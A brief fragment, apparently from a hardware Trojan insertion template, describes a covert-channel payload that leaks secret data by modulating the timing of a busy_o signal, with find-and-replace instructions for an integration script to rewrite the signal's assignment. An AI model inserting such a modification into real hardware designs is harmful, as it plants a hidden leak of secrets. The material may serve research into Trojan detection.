 ...
 * Payload: Modulate timing of busy_o based on secret data
 * 
...
// ============================================================
// Covert Channel: Modulate timing of busy_o
//
// Integration Script Must Modify:
//
// IF busy_o is timing-sensitive:
//   Find: assign busy_o = ready_signal;
//   Replace: assign busy_o = (timing_delay == 0) ? ready_signal : 1'b0;
//
